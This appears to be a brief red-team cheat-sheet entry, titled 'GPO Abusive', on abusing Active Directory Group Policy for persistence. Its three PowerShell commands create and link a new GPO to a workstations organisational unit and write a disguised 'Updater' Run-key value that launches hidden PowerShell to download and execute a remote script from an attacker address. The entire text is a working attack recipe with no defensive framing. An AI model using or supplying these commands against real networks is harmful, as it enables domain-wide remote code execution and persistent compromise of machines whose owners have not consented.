### GPO Abusive
```
powershell Get-Module -List -Name GroupPolicy | Select-Object -ExpandProperty ExportedCommands
powershell New-GPO -Name 'MeMe' | New-GPLink -Target 'OU=5735,OU=Workstations,DC=cyberbotic,DC=io'
powershell  Set-GPPrefRegistryValue -Name 'MeMe' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'powershell -w 1 -c "iex (new-object net.webclient).downloadstring(''http://10.8.0.166:80/download/123.ps1'')"' -Type ExpandString
```
